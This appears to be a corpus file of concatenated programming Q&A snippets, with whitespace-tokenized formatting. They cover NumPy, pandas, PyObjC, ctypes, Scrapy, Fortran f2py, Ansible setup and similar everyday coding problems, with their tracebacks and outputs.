) ) A1_dot = np.dot ( X_train , w1 ) + b1 A1_sig = sigmoid ( A1_dot ) .T w2=np.random.uniform ( low=-1 , high=1 , size= ( 2 , 3 ) ) b2=np.random.uniform ( low=1 , high=1 , size= ( 2 , 1 ) ) A2_dot = np.dot ( A1_dot , w2 ) + b2 A2_sig = sigmoid ( A2_dot ) return ( A2_sig ) def backProp ( ) : global A2_sig ; global A1_sig ; error1 = np.dot ( ( A2_sig - Y_trainT.T ) .T , A1_sig / M ) error2 = error1 - A1_sig return ( error1 ) print ( forwardProp ( ) ) print ( backProp ( ) ) ValueError Traceback ( most recent call last ) < ipython-input-664-25e99255981f > in < module > ( ) 47 48 print ( forwardProp ( ) ) -- - > 49 print ( backProp ( ) ) < ipython-input-664-25e99255981f > in backProp ( ) 42 43 error1 = np.dot ( ( A2_sig - Y_trainT.T ) .T , A1_sig / M ) -- - > 44 error2 = error1.T - A1_sig 45 46 return ( error1 ) ValueError : operands could not be broadcast together with shapes ( 2,3 ) ( 2,2 )"
"Mac : ~ kuzzooroo $ pythonPython 2.7.15 |Anaconda , Inc.| ( default , Dec 14 2018 , 13:10:39 ) [ GCC 4.2.1 Compatible Clang 4.0.1 ( tags/RELEASE_401/final ) ] on darwinType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > import AppKitTraceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > ImportError : No module named AppKit > > > import appkitTraceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /Users/kuzzooroo/anaconda2/lib/python2.7/site-packages/appkit/__init__.py '' , line 11 , in < module > from AppKit import _metadataImportError : No module named AppKit Mac : ~ kuzzooroo $ brew install PyGObject PyGObject3Warning : pygobject 2.28.7_1 is already installed and up-to-dateTo reinstall 2.28.7_1 , run ` brew reinstall pygobject ` Warning : pygobject3 3.30.4 is already installed and up-to-dateTo reinstall 3.30.4 , run ` brew reinstall pygobject3 ` Mac : ~ kuzzooroo $ pip install AppKit PyObjC PyObjC-coreRequirement already satisfied : AppKit in ./anaconda2/lib/python2.7/site-packages ( 0.2.8 ) Requirement already satisfied : PyObjC in ./anaconda2/lib/python2.7/site-packages ( 5.1.2 ) Requirement already satisfied : PyObjC-core in ./anaconda2/lib/python2.7/site-packages ( 5.1.2 ) Requirement already satisfied : ... < many more lines >"
"class A { vector < double > v ; double & x ( int i ) { return v [ 2*i ] ; } double & y ( int i ) { return v [ 2*i+1 ] ; } double x ( int i ) const { return v [ 2*i ] ; } double y ( int i ) const { return v [ 2*i+1 ] ; } } a = A ( ) a.x [ 0 ] = 4print a.x [ 0 ] a = A ( ) a [ ' x ' , 0 ] = 4print a [ ' x ' , 0 ]"
df1 Name Age 0 Tom 341 Sara 182 Eva 443 Jack 274 Laura 30df2 Name Sex 0 Tom M1 Paul M2 Eva F3 Jack M4 Michelle F df1 Name Age Sex0 Tom 34 M1 Sara 18 NaN2 Eva 44 F3 Jack 27 M4 Laura 30 NaN
"# ! /usr/bin/env pythonfrom sys import stdindef main ( ) : for line in stdin : try : fields = line.split ( ' '' ' , 6 ) print ( fields [ 5 ] ) except : passif __name__ == '__main__ ' : main ( ) $ time zcat access.log.gz | python3 -m cProfile ./ua.py > /dev/nullreal 0m13.276suser 0m18.977ssys 0m0.484s $ time zcat access.log.gz | python2 -m cProfile ./ua.py > /dev/nullreal 0m6.139suser 0m11.693ssys 0m0.408s $ zcat access.log.gz | python3 -m cProfile ./ua.py | tail -15 Ordered by : standard name ncalls tottime percall cumtime percall filename : lineno ( function ) 1 0.000 0.000 0.000 0.000 < frozen importlib._bootstrap > :1594 ( _handle_fromlist ) 196806 0.234 0.000 0.545 0.000 codecs.py:298 ( decode ) 1 0.000 0.000 13.598 13.598 ua.py:3 ( < module > ) 1 4.838 4.838 13.598 13.598 ua.py:6 ( main ) 1 0.000 0.000 13.598 13.598 { built-in method exec } 1 0.000 0.000 0.000 0.000 { built-in method hasattr } 4300456 4.726 0.000 4.726 0.000 { built-in method print } 196806 0.312 0.000 0.312 0.000 { built-in method utf_8_decode } 1 0.000 0.000 0.000 0.000 { method 'disable ' of '_lsprof.Profiler ' objects } 4300456 3.489 0.000 3.489 0.000 { method 'split ' of 'str ' objects } $ zcat access.log.gz | python2 -m cProfile ./ua.py | tail -10 Ordered by : standard name ncalls tottime percall cumtime percall filename : lineno ( function ) 1 0.000 0.000 6.573 6.573 ua.py:3 ( < module > ) 1 3.894 3.894 6.573 6.573 ua.py:6 ( main ) 1 0.000 0.000 0.000 0.000 { method 'disable ' of '_lsprof.Profiler ' objects } 4300456 2.680 0.000 2.680 0.000 { method 'split ' of 'str ' objects }"
"class Hello : def aaa ( self , msg= '' '' ) : print ( `` { msg } aaa '' .format ( msg=msg ) ) def bbb ( self , msg= '' '' ) : print ( `` { msg } bbb '' .format ( msg=msg ) ) if __name__ == `` __main__ '' : h = Hello ( ) h.aaa ( `` hello '' ) h.bbb ( `` hello '' ) # hello aaa # hello bbb def *wildcard* ( self , msg= '' '' ) : method = __name__which__was__used__to__call__me__ print ( `` { msg } { method } '' .format ( msg=msg , method=method ) )"
"import pandas as pdtuples = [ ( 0 , 100 , 1000 ) , ( 0 , 100 , 1001 ) , ( 0 , 100 , 1002 ) , ( 1 , 101 , 1001 ) ] index_3levels=pd.MultiIndex.from_tuples ( tuples , names= [ `` l1 '' , '' l2 '' , '' l3 '' ] ) tuples = [ ( 0 , 100 ) , ( 1 , 101 ) ] index_2levels=pd.MultiIndex.from_tuples ( tuples , names= [ `` l1 '' , '' l2 '' ] ) data_3levels = pd.Series ( 1 , index=index_3levels ) data_2levels = pd.Series ( [ 2,3 ] , index=index_2levels ) print data_3levels l1 l2 l3 0 100 1000 1 1001 1 1002 11 101 1001 1dtype : int64print data_2levelsl1 l2 0 100 21 101 3dtype : int64 data_2levels.reindex ( data_3levels.index , level= [ `` l1 '' , '' l2 '' ] ) Exception : Join on level between two MultiIndex objects is ambiguous for l1 in [ 0,1 ] : data_3levels [ l1 ] *= data_2levels [ l1 ] .reindex ( data_3levels [ l1 ] .index , level= '' l2 '' ) print data_3levelsl1 l2 l3 0 100 1000 2 1001 2 1002 21 101 1001 3dtype : int64"
"class SomeClass ( object ) : def __init__ ( self , someattribute= '' somevalue '' ) : self.someattribute = someattribute def __eq__ ( self , other ) : return self.someattribute == other.someattribute def __ne__ ( self , other ) : return not self.__eq__ ( other ) list_of_objects = [ SomeClass ( ) ] print ( SomeClass ( ) in list_of_objects ) set_of_objects = set ( [ SomeClass ( ) ] ) print ( SomeClass ( ) in set_of_objects ) TrueFalse"
class Student ( models.Model ) : name=models.CharField ( max_length=100 ) school=models.CharField ( max_length=100 ) created_at=models.DateField ( auto_now_add=True ) is_active=models.BooleanField ( default=False ) def __str__ ( self ) : return self.name
"def fact ( n ) : if n == 0 : return 1 return n * fact ( n-1 ) def recursive_fact ( n ) : lookup = { 0 : 1 } return lookup.get ( n , n*recursive_fact ( n-1 ) )"
"MODULE test INTEGER , PARAMETER : : a = 1END MODULE testMODULE test2 USE test INTEGER , PARAMETER : : b = 2END MODULE test2 ! -*- f90 -*- ! Note : the context of this file is case sensitive.python module test ! in interface ! in : test module test ! in : test : test.f90 integer , parameter , optional : : a=1 end module test module test2 ! in : test : test2.f90 use test integer , parameter , optional : : b=2 end module test2 end interfaceend python module test ! This file was auto-generated with f2py ( version:2 ) . ! See http : //cens.ioc.ee/projects/f2py2e/ In [ 1 ] : import testIn [ 2 ] : print test.test.a1In [ 3 ] : print test.test2.b2In [ 4 ] : print test.test2.a -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -AttributeError Traceback ( most recent call last ) /users/solbrig/svn_checkouts/inversion/satmet/branches/solbrig/rootpath/data/users/GeoIPS/src/test/ < ipython-input-4-bffcf464e408 > in < module > ( ) -- -- > 1 print test.test2.aAttributeError : a SUBROUTINE run_test ( ) USE test2 IMPLICIT NONE print * , `` a = `` , a print * , `` b = `` , bEND SUBROUTINE run_test In [ 1 ] : import run_testIn [ 2 ] : run_test.run_test ( ) a = 1 b = 2"
"class b ( a ) : def __init__ ( self , name , age ) : self.name=name self.age=age super ( b , self ) .__init__ ( name , age ) class b ( a ) : def __init__ ( self , name , age ) : super ( b , self ) .__init__ ( name , age ) self.name=name self.age=age class Mymodel ( models.Model ) : photo = models.ImageField ( upload_to= '' ... '' , blank=True ) def save ( self , *args , **kwargs ) : image_resized = kwargs.pop ( 'image_resized ' , False ) super ( Mymodel , self ) .save ( *args , **kwargs ) if self.photo and image_resized : basewidth = 300 filename = self.get_source_filename ( ) image = Image.open ( filename ) wpercent = ( basewidth/float ( image.size [ 0 ] ) ) hsize = int ( ( float ( image.size [ 1 ] ) *float ( wpercent ) ) ) img = image.resize ( ( basewidth , hsize ) , PIL.Image.ANTIALIAS ) self.photo = img self.save ( image_resized = True )"
"> > > struct.pack ( `` i '' ,34 ) ' '' \x00\x00\x00 '"
SAM359NanNan2440Nan57
"# -- -- -- paul -- -- -def f0 ( x , alph='ABCDE ' ) : result = `` ct = len ( alph ) while x > =0 : result += alph [ x % ct ] x /= ct-1 return result [ : :-1 ] # -- -- - Glenn Maynard -- -- -import mathdef idx_to_length_and_value ( n , length ) : chars = 1 while True : cnt = pow ( length , chars ) if cnt > n : return chars , n chars += 1 n -= cntdef conv_base ( chars , n , values ) : ret = [ ] for i in range ( 0 , chars ) : c = values [ n % len ( values ) ] ret.append ( c ) n /= len ( values ) return reversed ( ret ) def f1 ( i , values = `` ABCDEF '' ) : chars , n = idx_to_length_and_value ( i , len ( values ) ) return `` '' .join ( conv_base ( chars , n , values ) ) # -- -- -- -- Laurence Gonsalves -- -- -- def f2 ( i , seq ) : seq = tuple ( seq ) n = len ( seq ) max = n # number of perms with 'digits ' digits digits = 1 last_max = 0 while i > = max : last_max = max max = n * ( max + 1 ) digits += 1 result = `` i -= last_max while digits : digits -= 1 result = seq [ i % n ] + result i //= n return result # -- -- -- -- yairchu -- -- -- -def f3 ( x , alphabet = 'ABCDEF ' ) : x += 1 # Make us skip `` '' as a valid word group_size = 1 num_letters = 0 while 1 : # for num_letters in itertools.count ( ) : if x < group_size : break x -= group_size group_size *= len ( alphabet ) num_letters +=1 letters = [ ] for i in range ( num_letters ) : x , m = divmod ( x , len ( alphabet ) ) letters.append ( alphabet [ m ] ) return `` .join ( reversed ( letters ) ) # -- -- - testing -- -- import timeimport randomtries = [ random.randint ( 1,1000000000000 ) for i in range ( 10000 ) ] numbs = 'ABCDEF'time0 = time.time ( ) s0 = [ f1 ( i , numbs ) for i in tries ] print 's0 paul ' , time.time ( ) -time0 , 'sec'time0 = time.time ( ) s1 = [ f1 ( i , numbs ) for i in tries ] print 's1 Glenn Maynard ' , time.time ( ) -time0 , 'sec'time0 = time.time ( ) s2 = [ f2 ( i , numbs ) for i in tries ] print 's2 Laurence Gonsalves ' , time.time ( ) -time0 , 'sec'time0 = time.time ( ) s3 = [ f3 ( i , numbs ) for i in tries ] print 's3 yairchu ' , time.time ( ) -time0 , 'sec ' s0 paul 0.470999956131 secs1 Glenn Maynard 0.472999811172 secs2 Laurence Gonsalves 0.259000062943 secs3 yairchu 0.325000047684 sec > > > s0==s1==s2==s3True"
nosetests
"Timer unit : 1e-06 sTotal time : 0 sFile : < ipython-input-29-486f0a3cdf73 > Function : conv at line 1Line # Hits Time Per Hit % Time Line Contents============================================================== 1 @ numba.jit 2 def conv ( f , w ) : 3 f_full = np.zeros ( np.int ( f.size + ( 2 * w.size ) - 2 ) , dtype=np.float64 ) 4 for i in range ( 0 , f_full.size ) : 5 if i > = w.size - 1 and i < w.size + f.size - 1 : 6 f_full [ i ] = f [ i - w.size + 1 ] 7 w = w [ : :-1 ] 8 g = np.zeros ( f_full.size-w.size + 1 , dtype=np.float64 ) 9 for i in range ( 0 , f_full.size - w.size ) : 10 g [ i ] = np.sum ( np.multiply ( f_full [ i : i+w.size ] , w ) ) 11 return g"
"try : f = open ( 'foo ' , ' r ' ) except IOError as e : error_log.write ( 'Unable to open foo : % s\n ' % e ) else : data = f.read ( ) f.close ( ) try : f = open ( 'foo ' , ' r ' ) data = f.read ( ) f.close ( ) except IOError as e : error_log.write ( 'Unable to open foo : % s\n ' % e )"
./myapp : error while loading shared libraries : libtensorflowlite.so : can not open shared object file : No such file or directory bazel build -- config=monolithic -- define=with_select_tf_ops=true -c opt //tensorflow/lite : libtensorflowlite.so
"from kivy.setupconfig import USE_SDL2def share ( path ) : if platform == 'android ' : from jnius import cast from jnius import autoclass if USE_SDL2 : PythonActivity = autoclass ( 'org.kivy.android.PythonActivity ' ) else : PythonActivity = autoclass ( 'org.renpy.android.PythonActivity ' ) Intent = autoclass ( 'android.content.Intent ' ) String = autoclass ( 'java.lang.String ' ) Uri = autoclass ( 'android.net.Uri ' ) File = autoclass ( 'java.io.File ' ) shareIntent = Intent ( Intent.ACTION_SEND ) shareIntent.setType ( ' '' image/* '' ' ) imageFile = File ( path ) uri = Uri.fromFile ( imageFile ) shareIntent.putExtra ( Intent.EXTRA_STREAM , uri ) currentActivity = cast ( 'android.app.Activity ' , PythonActivity.mActivity ) currentActivity.startActivity ( shareIntent )"
"class Container ( object ) : class ExampleDescriptor ( object ) : def __get__ ( self , instance , owner ) : return instance._name def __set__ ( self , instance , value ) : instance._name = value managed_attr = ExampleDescriptor ( )"
"from itertools import combinations as cbdef allowed_combinations ( elements , combination_size=4 , max_colors=3 ) : colors = set ( [ c for k , c in elements.items ( ) ] ) combinations = cb ( elements , combination_size ) for combination in combinations : colors = set ( [ elements [ element ] for element in combination ] ) if len ( colors ) > max_colors : continue yield combinationelements = dict ( ) elements [ ' A ' ] = 'red'elements [ ' B ' ] = 'red'elements [ ' C ' ] = 'blue'elements [ 'D ' ] = 'blue'elements [ ' E ' ] = 'green'elements [ ' F ' ] = 'green'elements [ ' G ' ] = 'green'elements [ ' H ' ] = 'yellow'elements [ ' I ' ] = 'white'elements [ ' J ' ] = 'white'elements [ ' K ' ] = 'black'combinations = allowed_combinations ( elements ) for c in combinations : for element in c : print ( `` % s- % s '' % ( element , elements [ element ] ) ) print `` \n '' A-redC-blueB-redE-greenA-redC-blueB-redD-blueA-redC-blueB-redG-greenA-redC-blueB-redF-green ..."
function f ( ) { var a=0 ; function g ( ) { alert ( a++ ) ; } return g ; } g=f ( ) g ( ) def f ( ) : a=0 def g ( ) : a+=1 print a return gg=f ( ) g ( )
"Out [ 90 ] : customer_id created_at0 11492288 2017-03-15 10:20:18.2804371 8953727 2017-03-16 12:51:00.1456292 11492288 2017-03-15 10:20:18.2849743 11473213 2017-03-09 14:15:22.7123694 9526296 2017-03-14 18:56:04.6654105 9526296 2017-03-14 18:56:04.662082 Out [ 90 ] : customer_id created_at code0 11492288 2017-03-15 10:20:18.280437 nKAILfyV1 8953727 2017-03-16 12:51:00.145629 785Vsw0b2 11492288 2017-03-15 10:20:18.284974 nKAILfyV3 11473213 2017-03-09 14:15:22.712369 dk6JXq3u4 9526296 2017-03-14 18:56:04.665410 1WESdAsD5 9526296 2017-03-14 18:56:04.662082 1WESdAsD library ( dplyr ) library ( stringi ) df % > % group_by ( customer_id ) % > % mutate ( code = stri_rand_strings ( 1 , 8 ) )"
def evenGlassHour ( target ) : jsp=1 jtop=target jbot=2 jbotspace=int ( target/2 ) eventarget=int ( target/2 ) temp= '' '' for i in range ( eventarget ) : for j in range ( i ) : temp+= '' `` for jsp in range ( jtop ) : temp+= '' @ '' jtop-=2 temp+= '' \n '' for i in range ( eventarget-1 ) : for j in range ( jbotspace-2 ) : temp+= '' `` for j in range ( jbot+2 ) : temp+= '' @ '' jbot+=2 jbotspace-=1 temp+= '' \n '' print ( temp ) def oddGlassHour ( target ) : jsp=1 jtop=target jbot=1 jbotspace=int ( target/2 ) oddtarget=int ( target/2 ) temp= '' '' for i in range ( oddtarget ) : for j in range ( i ) : temp+= '' `` for jsp in range ( jtop ) : temp+= '' @ '' jtop-=2 temp+= '' \n '' for i in range ( oddtarget+1 ) : for j in range ( jbotspace ) : temp+= '' `` for j in range ( jbot ) : temp+= '' @ '' jbot+=2 jbotspace-=1 temp+= '' \n '' print ( temp ) target=int ( input ( `` Input : `` ) ) if ( target % 2==0 ) : evenGlassHour ( target ) else : oddGlassHour ( target ) Input : 6 @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ Input : 7 @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @ @
"string = `` Jun 20 , 4:00PM EDT ''"
"locale.setlocale ( locale.LC_TIME , ( 'de ' , 'UTF-8 ' ) ) Montag , 11 . April 2016 19:35:57 note_date = parser.parse ( result.group ( 2 ) )"
"whitespace = [ 0x9 , 0xb , 0xc , 0x20 , 0xa0 , 0xfeff ] > > > ord ( unicodedata.lookup ( `` NO-BREAK SPACE '' ) ) 160"
"name status number messagematt active 12345 [ job : , money : none , wife : none ] james active 23456 [ group : band , wife : yes , money : 10000 ] adam inactive 34567 [ job : none , money : none , wife : , kids : one , group : jail ] name status number job money wife group kids matt active 12345 none none none none nonejames active 23456 none 10000 none band noneadam inactive 34567 none none none none one"
"import sysfrom PyQt4 import QtGuifrom PyQt4.uic import loadUiTypeUi_MainWindow , QMainWindow = loadUiType ( 'try.ui ' ) class Main ( QMainWindow , Ui_MainWindow ) : def __init__ ( self , ) : super ( Main , self ) .__init__ ( ) self.setupUi ( self ) if __name__ == '__main__ ' : app = QtGui.QApplication ( sys.argv ) main = Main ( ) main.show ( ) sys.exit ( app.exec_ ( ) ) < ? xml version= '' 1.0 '' encoding= '' UTF-8 '' ? > < ui version= '' 4.0 '' > < class > Form < /class > < widget class= '' QWidget '' name= '' Form '' > < property name= '' geometry '' > < rect > < x > 0 < /x > < y > 0 < /y > < width > 211 < /width > < height > 157 < /height > < /rect > < /property > < property name= '' windowTitle '' > < string > Form < /string > < /property > < widget class= '' QPushButton '' name= '' pushButton '' > < property name= '' geometry '' > < rect > < x > 60 < /x > < y > 60 < /y > < width > 75 < /width > < height > 23 < /height > < /rect > < /property > < property name= '' text '' > < string > PushButton < /string > < /property > < /widget > < /widget > < resources/ > < connections/ > < /ui >"
"[ '2011-02-27 ' , '2011-02-28 ' , '2011-03-01 ' , '2011-04-12 ' , '2011-04-13 ' , '2011-06-08 ' ] [ { `` start_date '' : '2011-02-27 ' , `` end_date '' : '2011-03-01 ' } , { `` start_date '' : '2011-04-12 ' , `` end_date '' : '2011-04-13 ' } , { `` start_date '' : '2011-06-08 ' , `` end_date '' : '2011-06-08 ' } ]"
"M = np.random.rand ( 5 , 3 ) [ [ 0.25891593 0.07299478 0.36586996 ] [ 0.30851087 0.37131459 0.16274825 ] [ 0.71061831 0.67718718 0.09562581 ] [ 0.71588836 0.76772047 0.15476079 ] [ 0.92985142 0.22263399 0.88027331 ] ] np.array ( [ np.diag ( row ) for row in M ] ) array ( [ [ [ 0.25891593 , 0. , 0 . ] , [ 0. , 0.07299478 , 0 . ] , [ 0. , 0. , 0.36586996 ] ] , [ [ 0.30851087 , 0. , 0 . ] , [ 0. , 0.37131459 , 0 . ] , [ 0. , 0. , 0.16274825 ] ] , [ [ 0.71061831 , 0. , 0 . ] , [ 0. , 0.67718718 , 0 . ] , [ 0. , 0. , 0.09562581 ] ] , [ [ 0.71588836 , 0. , 0 . ] , [ 0. , 0.76772047 , 0 . ] , [ 0. , 0. , 0.15476079 ] ] , [ [ 0.92985142 , 0. , 0 . ] , [ 0. , 0.22263399 , 0 . ] , [ 0. , 0. , 0.88027331 ] ] ] )"
"yum install https : //dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpmyum -- enablerepo=epel install ansible ansible all -m ping wget -q https : //s3.amazonaws.com/aws-cli/awscli-bundle.zipunzip awscli-bundle.zip./awscli-bundle/install -i /opt/aws -b /usr/bin/aws aws ec2 describe-instances yum -- enablerepo=epel install python2-boto [ root @ vm09 ansible ] # ./ec2.py -- listTraceback ( most recent call last ) : File `` ./ec2.py '' , line 1642 , in < module > Ec2Inventory ( ) File `` ./ec2.py '' , line 193 , in __init__ self.do_api_calls_update_cache ( ) File `` ./ec2.py '' , line 525 , in do_api_calls_update_cache self.get_instances_by_region ( region ) File `` ./ec2.py '' , line 615 , in get_instances_by_region self.add_instance ( instance , region ) File `` ./ec2.py '' , line 934 , in add_instance if self.group_by_platform : AttributeError : 'Ec2Inventory ' object has no attribute 'group_by_platform '"
"xlsx = pandas.ExcelFile ( filename ) frame = xlsx.parse ( xlsx.sheet_names [ 0 ] ) media_frame = frame [ media_headers ] # just get the cols that need replacingfrom_filenames = get_from_filenames ( ) # returns ~9500 filenames to replace in DFto_filenames = get_to_filenames ( ) media_frame = media_frame.replace ( from_filenames , to_filenames ) frame.update ( media_frame ) frame.to_excel ( filename )"
"# Python importsfrom ctypes import CDLLimport numpy as np # Open shared CPP library : cpplib=CDLL ( './libsoexample.so ' ) cppobj = cpplib.CPPClass_py ( ) # Stuck on converting to short** ? array = np.array ( [ [ 1,2,3 ] , [ 1,2,3 ] ] ) cpplib.func_py ( cppobj , array ) # include < iostream > using namespace std ; class CPPClass { public : CPPClass ( ) { } void func ( unsigned short **array ) { cout < < array [ 0 ] [ 0 ] < < endl ; } } ; // For use with python : extern `` C '' { CPPClass* CPPClass_py ( ) { return new CPPClass ( ) ; } void func_py ( CPPClass* myClass , unsigned short **array ) { myClass- > func ( array ) ; } } g++ -fPIC -Wall -Wextra -shared -o libsoexample.so soexample.cpp > > python soexample.pyTraceback ( most recent call last ) : File `` soexample.py '' , line 13 , in < module > cpplib.func_py ( cppobj , array ) ctypes.ArgumentError : argument 2 : < type 'exceptions.TypeError ' > : Do n't know how to convert parameter 2"
"class WebCrawler ( SitemapSpider , CrawlSpider ) : name = `` flipkart '' allowed_domains = [ 'flipkart.com ' ] sitemap_urls = [ 'http : //www.flipkart.com/robots.txt ' ] sitemap_rules = [ ( regex ( '/ ( .* ? ) /p/ ( .* ? ) ' ) , 'parse_product ' ) ] start_urls = [ 'http : //www.flipkart.com/ ' ] rules = [ Rule ( LinkExtractor ( allow= [ '/ ( .* ? ) /product-reviews/ ( .* ? ) ' ] ) , 'parse_reviews ' ) , Rule ( LinkExtractor ( restrict_xpaths='//div [ @ class= '' fk-navigation fk-text-center tmargin10 '' ] ' ) , follow=True ) ] def parse_product ( self , response ) : loader = FlipkartItemLoader ( response=response ) loader.add_value ( 'pid ' , 'value of pid ' ) loader.add_xpath ( 'name ' , 'xpath to name ' ) yield loader.load_item ( ) def parse_reviews ( self , response ) : loader = ReviewItemLoader ( response=response ) loader.add_value ( 'pid ' , 'value of pid ' ) loader.add_xpath ( 'review_title ' , 'xpath to review title ' ) loader.add_xpath ( 'review_text ' , 'xpath to review text ' ) yield loader.load_item ( )"
Started by user anonymousBuilding in workspace /usr/share/tomcat7/.jenkins/jobs/PythonUIProject/workspace > git rev-parse -- is-inside-work-tree # timeout=10Fetching changes from the remote Git repository > git config remote.origin.url /home/rahul/PycharmProjects/.git/ # timeout=10Fetching upstream changes from /home/rahul/PycharmProjects/.git/ > git -- version # timeout=10 > git -c core.askpass=true fetch -- tags -- progress /home/rahul/PycharmProjects/.git/ +refs/heads/* : refs/remotes/origin/*Seen 0 remote branchesERROR : Could n't find any revision to build . Verify the repository and branch configuration for this job.Finished : FAILURE rahul @ oneplusone : ~/PycharmProjects $ git push -u /home/rahul/PycharmProjects/.git master error : src refspec master does not match any . error : failed to push some refs to '/home/rahul/PycharmProjects/.git '
x = `` xtop '' y = `` ytop '' def func ( ) : x = `` xlocal '' y = `` ylocal '' class C : print ( x ) print ( y ) y = 1func ( ) xlocalytop
"( 'id ' , ( 'name ' , ( 'name_float_fml ' , ) ) , ( 'user ' , ( 'email ' , ) ) , ( 'user ' , ( 'last_login ' , ) ) ) ( 'id ' , ( 'name ' , ( 'name_float_fml ' , ) ) , ( 'user ' , ( 'email ' , 'last_login ' ) ) ) ( ( 'baz ' , ( 'bing ' , ( 'fizz ' , 'frozz ' , ( 'frazz ' , ( 'fry ' , 'bleep ' , 'blop ' ) ) ) ) ) , ( 'baz ' , ( 'zap ' , ( 'zang ' , ) ) ) , 'foo ' , 'bar ' ) ( ( 'baz ' , ( ( 'bing ' , ( 'fizz ' , 'frozz ' , ( 'frazz ' , ( 'fry ' , 'bleep ' , 'blop ' ) ) ) ) , ( 'zap ' , ( 'zang ' ) ) ) ) , 'foo ' , 'bar ' )"
"import colanderdef f ( data ) : class EventList ( colander.SequenceSchema ) : list_item = colander.SchemaNode ( colander.Int ( ) ) class Schema ( colander.MappingSchema ) : txt = colander.SchemaNode ( colander.String ( ) ) user = colander.SchemaNode ( colander.String ( ) ) events = EventList ( ) try : good_data = Schema ( ) .deserialize ( data ) print 'looks good ' except colander.Invalid as e : print `` man , your data suck '' good_data = { 'txt ' : 'BINGO ' , 'user ' : 'mogul ' , 'events ' : [ 11 , 22 , 33 ] } f ( good_data ) bad_data = { 'txt ' : 'BOOM ' , 'user ' : 'mogul ' , 'events ' : [ ] } f ( bad_data )"
"stack = np.array ( [ 0,0,5,4,1,1,1,5,1,1,5,1,1,1,5,1,1,5,1,1,5,1,1,5,1,1,5,1,1 ] ) # exampleimport numpy as npfrom scipy.signal import argrelextremastack = np.array ( [ 0,0,5,4,1,1,1,5,1,1,5,1,1,1,5,1,1,5,1,1,5,1,1,5,1,1,5,1,1 ] ) # for local maximay = argrelextrema ( stack , np.greater ) print ( y ) ( array ( [ 2 , 7 , 10 , 14 , 17 , 20 , 23 , 26 ] ) , ) array ( [ 0. , 5.70371806 , 5.21210157 , 3.71144767 , 3.9020162 , 3.87735984 , 3.89030171 , 6.00879918 , 4.91964227 , 4.37756275 , 4.03048542 , 4.26943028 , 4.02080471 , 7.54749062 , 3.9150576 , 4.08933851 , 4.01794766 , 4.13217794 , 4.15081972 , 8.11213474 , 4.6561735 , 4.54128693 , 3.63831552 , 4.3415324 , 4.15944019 , 8.55171441 , 4.86579459 , 4.13221943 , 4.487663 , 3.95297979 , 4.35334706 , 9.91524674 , 4.44738182 , 4.32562141 , 4.420753 , 3.54525697 , 4.07070637 , 9.21055852 , 4.87767969 , 4.04429321 , 4.50863677 , 3.38154581 , 3.73663523 , 3.83690315 , 6.95321174 , 5.11325128 , 4.50351938 , 4.38070175 , 3.20891173 , 3.51142661 , 7.80429569 , 3.98677631 , 3.89820773 , 4.15614576 , 3.47369797 , 3.73355768 , 8.85240649 , 6.0876192 , 3.57292324 , 4.43599135 , 3.77887259 , 3.62302175 , 7.03985076 , 4.91916556 , 4.22246518 , 3.48080777 , 3.26199699 , 2.89680969 , 3.19251448 ] ) ( array ( [ 1 , 4 , 7 , 11 , 13 , 15 , 19 , 23 , 25 , 28 , 31 , 34 , 37 , 40 , 44 , 50 , 53 , 56 , 59 , 62 ] ) , ) [ 1,7,13,19,25,31,37,44,50,56,62 ]"
1 . 04 . 02 . 01 . 12 . 13 . 13 . 21 . 22 . 2
"import Foundationimport WebKitimport AppKitimport objcdef main ( ) : app = AppKit.NSApplication.sharedApplication ( ) rect = Foundation.NSMakeRect ( 100,350,600,800 ) win = AppKit.NSWindow.alloc ( ) win.initWithContentRect_styleMask_backing_defer_ ( rect , AppKit.NSTitledWindowMask | AppKit.NSClosableWindowMask | AppKit.NSResizableWindowMask | AppKit.NSMiniaturizableWindowMask , AppKit.NSBackingStoreBuffered , False ) win.display ( ) win.orderFrontRegardless ( ) webview = WebKit.WebView.alloc ( ) webview.initWithFrame_ ( rect ) webview.preferences ( ) .setUserStyleSheetEnabled_ ( objc.YES ) print webview.preferences ( ) .userStyleSheetEnabled ( ) cssurl = Foundation.NSURL.URLWithString_ ( `` http : //dev.stanpol.ru/user.css '' ) webview.preferences ( ) .setUserStyleSheetLocation_ ( cssurl ) print webview.preferences ( ) .userStyleSheetLocation ( ) pageurl = Foundation.NSURL.URLWithString_ ( `` http : //dev.stanpol.ru/index.html '' ) req = Foundation.NSURLRequest.requestWithURL_ ( pageurl ) webview.mainFrame ( ) .loadRequest_ ( req ) win.setContentView_ ( webview ) app.run ( ) if __name__ == '__main__ ' : main ( ) Truehttp : //dev.stanpol.ru/user.css pageurl = Foundation.NSURL.URLWithString_ ( `` http : //dev.stanpol.ru/index.html '' ) req = Foundation.NSURLRequest.requestWithURL_ ( pageurl ) webview.mainFrame ( ) .loadRequest_ ( req ) dom = webview.mainFrame ( ) .DOMDocument ( ) link = dom.createElement_ ( `` link '' ) link.setAttribute_value_ ( `` rel '' , `` StyleSheet '' ) link.setAttribute_value_ ( `` type '' , `` text/css '' ) link.setAttribute_value_ ( `` href '' , `` http : //dev.stanpol.ru/user.css '' ) head = dom.getElementsByTagName_ ( u '' head '' ) hf = head.item_ ( 0 ) hf.appendChild_ ( link )"
"for length in range ( int ( limit_min ) , int ( limit_max ) + 1 ) : percent_quotient = 0 j=0 while j < = ( int ( length * `` 9 '' ) ) : while len ( str ( j ) ) < length : j = `` 0 '' + str ( j ) percent_quotient+=1 j = int ( j ) + int ( step ) # increasing dummy variablefor length in range ( int ( limit_min ) , int ( limit_max ) + 1 ) : counter=1 i = 0 while i < = ( int ( length * `` 9 '' ) ) : while len ( str ( i ) ) < length : i = `` 0 '' + str ( i ) # print `` Writing % s to file . Progress : % .2f percent . '' % ( str ( i ) , ( float ( counter ) /percent_quotient ) *100 ) a.write ( str ( i ) + `` \n '' ) # this is where everything actually gets written i = int ( i ) + int ( step ) # increasing i counter+=1 if length ! = int ( limit_max ) : print `` Length % i done . Moving on to length of % i . '' % ( length , length + 1 ) else : print `` Length % i done . '' % ( length ) a.close ( ) # closing file streamprint `` All done . Closed file stream . New file size : % .2f megabytes 